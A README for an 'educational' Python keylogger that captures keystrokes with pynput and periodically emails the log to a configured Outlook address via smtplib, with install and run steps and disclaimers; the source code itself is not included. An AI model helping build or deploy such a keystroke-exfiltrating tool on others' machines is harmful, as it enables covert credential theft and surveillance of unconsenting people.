# Keylogger

This project provides an educational example of a keylogger developed using the Python programming language. The keylogger is designed as a simple demonstration for learning purposes. It records keyboard inputs and sends them via email at regular intervals. **Please note that this code should only be used responsibly and for educational purposes.**

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Usage](#usage)
- [Requirements](#requirements)
- [Disclaimer](#disclaimer)

## Introduction

This keylogger demonstrates how a basic keylogger can be implemented using the pynput library in Python. It captures keyboard input and saves it to a log. The logged data is then sent via email using the `smtplib` library.

## Features

- Captures keyboard inputs and records them in a log.
- Periodically sends the collected log via email.
- Minimal and educational codebase.

## Usage

1. Clone the repository to your local machine.
2. Make sure you have Python installed.
3. Install the required libraries using the following command:
   ```sh
   pip install pynput
   ```
4. Open the `keylogger.py` file in a text editor.
5. **Important:** Modify the `send_email` function parameters to use your own email and password. Replace the following line with your information:

  ```python
  send_email("your_email@outlook.com","your_password",log.encode('utf-8'))
  ```
Note: Remember to change "email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)" to use another mail service.

6. Run the script by executing the following command:
  ```sh
  python3 key_logger.py
  ```

The keylogger will start capturing keyboard inputs and periodically send logs to the provided email.

Note: Use this code responsibly and only on your own devices or with explicit permission. Unauthorized use of keyloggers is against the law and unethical.

## Requirements

- Python 3.x
- pynput library

Install the required library using the following command:

```sh
pip install pynput
```

## Disclaimer

This keylogger example is intended for educational and learning purposes only. It should not be used for any malicious or unauthorized activities. The developer and the provider of this code are not responsible for any misuse or legal consequences caused by the use of this code.
